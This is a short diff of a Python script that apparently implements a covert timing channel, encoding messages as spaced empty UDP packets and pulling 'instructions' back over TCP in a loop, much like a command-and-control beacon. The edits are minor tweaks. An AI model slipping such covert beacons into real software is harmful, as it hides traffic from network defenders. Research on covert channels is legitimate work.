@@ -33,11 +33,12 @@ def send_traffic(message:str):
             udpSock.sendto(b"",(HOST,PORT))
             time.sleep(WAITTIME)
     time.sleep(0.5)
-    udpSock.sendto(b"END",(HOST,PORT))
+    udpSock.sendto(b"END",(HOST,PORT)) #TODO provide better end method.
 
 
 def recv_traffic() -> str: #TODO improve this for better covert channels
     tcpSock = build_socket(Socket.SOCK_STREAM)
+    time.sleep(0.2)
     tcpSock.connect((HOST,PORT))
     output = tcpSock.recv(1024).decode()
     tcpSock.close()
@@ -55,7 +56,7 @@ def handle_traffic(instructions:str):
 
 
 def main():
-    toSend = ""
+    toSend = "SHK"
 
     while True:
         send_traffic(toSend)
